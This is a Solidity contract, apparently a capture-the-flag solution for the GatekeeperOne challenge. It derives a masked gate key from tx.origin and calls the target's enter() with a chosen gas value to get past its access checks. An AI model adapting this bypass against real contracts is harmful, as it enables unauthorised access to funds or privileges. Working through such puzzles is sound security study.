// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './GatekeeperOne.sol';

// interface IGateKeeperOne {
//   function entrant() external view returns (address);
//   function enter(bytes8) external returns (bool);
// }

contract GatekeeperOneHack {
  GatekeeperOne public gatekeeper;
  address public owner;

  constructor(address _gatekeeperContract) public payable {
    gatekeeper = GatekeeperOne(_gatekeeperContract);
    owner = payable(address(msg.sender));
  }


  function enterGate(uint256 _gas) external {

    bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    (bool sent ) = gatekeeper.enter{ gas: _gas}(gateKey);
  }
}